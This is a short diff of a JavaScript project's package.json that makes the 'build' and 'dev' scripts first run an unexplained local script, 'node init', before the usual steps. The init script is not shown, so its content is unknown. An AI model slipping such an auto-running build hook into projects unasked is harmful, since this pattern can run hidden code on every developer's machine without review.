@@ -4,8 +4,8 @@
   "private": true,
   "type": "module",
   "scripts": {
-    "build": "tsc --noEmit && vite build",
-    "dev": "vite --host 127.0.0.1 --port 1420",
+    "build": "node init && tsc --noEmit && vite build",
+    "dev": "node init && vite --host 127.0.0.1 --port 1420",
     "lint": "eslint src --max-warnings 0",
     "tauri": "tauri",
     "test": "vitest run",
